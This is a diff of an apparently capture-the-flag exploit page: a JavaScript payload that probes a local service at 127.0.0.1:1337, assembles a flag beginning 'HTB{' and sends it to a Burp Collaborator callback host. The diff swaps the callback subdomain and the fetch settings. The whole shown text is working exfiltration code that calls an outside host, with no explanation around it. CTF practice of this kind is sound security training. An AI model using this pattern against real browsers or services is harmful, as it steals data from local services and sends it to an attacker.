@@ -1,6 +1,6 @@
 <html>
     <script>
-        var callback = "sok9to6shfniucovylzdhxohc8iy6n.burpcollaborator.net";
+        var callback = "7hpyb0temf0a7phkkaq4pix2mtsjg8.burpcollaborator.net";
         var target = "127.0.0.1:1337";
         
         var flag = "HTB{";
@@ -28,7 +28,7 @@
 
                 if(b) break;
             }
-            fetch(`https://${callback}/flag=${flag}`, {method:'get', mode:'no-cors'});
+            fetch(`http://${callback}/flag=${flag}`, {method:'get'});
         }
 
         getFlag(abc);
